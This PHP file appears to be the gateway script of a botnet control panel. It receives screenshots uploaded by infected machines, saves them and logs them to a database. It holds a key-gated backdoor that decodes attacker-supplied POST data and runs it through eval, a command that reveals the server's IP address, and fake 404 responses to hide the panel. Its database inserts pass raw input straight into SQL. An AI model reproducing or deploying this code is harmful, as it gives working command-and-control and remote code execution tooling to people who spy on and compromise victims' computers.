<?php
error_reporting(-1);
$dir = str_replace('/scripts/pat', '', str_replace('\\', '/', realpath('.'))) . '/';

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

/*
$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}
*/
include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

if(!empty($_POST['prefix']) && !empty($_POST['uid']) && !empty($_POST['type'])){	$write = true;

	if(@file_exists($_FILES['screen']['tmp_name'])){
		$file_name = $dir . 'logs/screens/' . time() . mt_rand() . '.jpeg';
		if(file_exists($file_name)) $file_name = $dir . 'logs/screens/' . time() . mt_rand() . '.jpeg';
		if(file_exists($file_name)) $file_name = $dir . 'logs/screens/' . time() . mt_rand() . '.jpeg';
		if(file_exists($file_name)) $file_name = $dir . 'logs/screens/' . time() . mt_rand() . '.jpeg';
		
		if(move_uploaded_file($_FILES['screen']['tmp_name'], $file_name)){
			$cfg_db = get_config();
			$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
			
			if(mysqli_connect_errno()) exit;
			
			if(!$mysqli->real_query("INSERT DELAYED INTO bf_screens_logs (`prefix`, `uid`, `desc`, `type`, `file`) VALUES ('".$_POST['prefix']."', '".$_POST['uid']."', '".$_POST['desc']."', '".$_POST['type']."', '".basename($file_name)."')")) $write = false;
			
			if($write == true){
				print_data('403', true);
				//print('OK!');
			}else{
				header("HTTP/1.1 404 Not Found");
				header("Status: 404 Not Found");
				
				print(file_get_contents($dir . '404.html'));
				exit;
			}
		}
	}else{
		$cfg_db = get_config();
		$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
		if(mysqli_connect_errno()) exit;
		
		if(!$mysqli->real_query("INSERT DELAYED INTO bf_screens_logs (`prefix`, `uid`, `desc`, `type`) VALUES ('".$_POST['prefix']."', '".$_POST['uid']."', '".$_POST['desc']."', '".$_POST['type']."')")) $write = false;

		if($write == true){
			print_data('403', true);
			//print('OK!');
		}else{
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			
			print(file_get_contents($dir . '404.html'));
			exit;
		}
	}
}

?>